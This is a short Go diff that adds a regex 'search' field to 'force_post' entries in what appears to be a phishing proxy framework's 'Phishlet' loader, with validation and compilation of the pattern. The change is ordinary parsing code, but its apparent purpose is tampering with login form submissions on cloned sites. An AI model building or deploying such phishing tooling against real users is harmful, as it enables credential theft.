@@ -73,8 +73,9 @@ type ForcePostSearch struct {
 }
 
 type ForcePostForce struct {
-	key   string `mapstructure:"key"`
-	value string `mapstructure:"value"`
+	key    string         `mapstructure:"key"`
+	search *regexp.Regexp `mapstructure:"search"`
+	value  string         `mapstructure:"value"`
 }
 
 type ForcePost struct {
@@ -187,8 +188,9 @@ type ConfigForcePostSearch struct {
 }
 
 type ConfigForcePostForce struct {
-	Key   *string `mapstructure:"key"`
-	Value *string `mapstructure:"value"`
+	Key    *string `mapstructure:"key"`
+	Search *string `mapstructure:"search"`
+	Value  *string `mapstructure:"value"`
 }
 
 type ConfigForcePost struct {
@@ -738,13 +740,19 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				if op_f.Key == nil {
 					return fmt.Errorf("force_post: missing force `key` field")
 				}
+				if op_f.Search == nil {
+					return fmt.Errorf("force_post: missing force `search` field")
+				}
 				if op_f.Value == nil {
 					return fmt.Errorf("force_post: missing force `value` field")
 				}
-
 				f_f := ForcePostForce{
 					key:   p.paramVal(*op_f.Key),
 					value: p.paramVal(*op_f.Value),
+				}
+				f_f.search, err = regexp.Compile(p.paramVal(*op_f.Search))
+				if err != nil {
+					return err
 				}
 				fpf.force = append(fpf.force, f_f)
 			}
